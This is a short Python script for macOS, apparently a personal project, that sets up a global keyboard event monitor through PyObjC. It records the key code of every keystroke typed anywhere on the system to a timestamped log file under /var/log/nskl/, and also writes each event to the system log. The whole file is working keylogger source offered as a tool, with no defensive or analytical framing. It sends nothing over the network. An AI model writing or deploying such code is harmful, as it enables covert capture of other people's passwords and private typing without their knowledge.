#!/usr/bin/python
# -*- coding: utf-8 -*-
#
########################################
##
# @author:          Amyth
# @email:           mail@amythsingh.com
# @website:         www.techstricks.com
# @created_date: 02-06-2017
# @last_modify: Fri Sep  1 13:23:05 2017
##
########################################

import datetime

from AppKit import NSApplication, NSApp
from Foundation import NSObject, NSLog
from Cocoa import NSEvent, NSKeyDownMask
from PyObjCTools import AppHelper


log_name = '/var/log/nskl/%s.log' % datetime.datetime.now().strftime('%d-%b-%Y-%H:%M')
log_file = open(log_name, 'a+')


class AppDelegate(NSObject):
    def applicationDidFinishLaunching_(self, notification):
        mask = NSKeyDownMask
        NSEvent.addGlobalMonitorForEventsMatchingMask_handler_(mask, handler)

def handler(event):
    try:
        log_file.write('%s\n' % (event.keyCode.__str__()))
        NSLog(u"%@", event)
    except KeyboardInterrupt:
        AppHelper.stopEventLoop()
        log_file.close()

def main():
    app = NSApplication.sharedApplication()
    delegate = AppDelegate.alloc().init()
    NSApp().setDelegate_(delegate)
    AppHelper.runEventLoop()

if __name__ == '__main__':
    main()
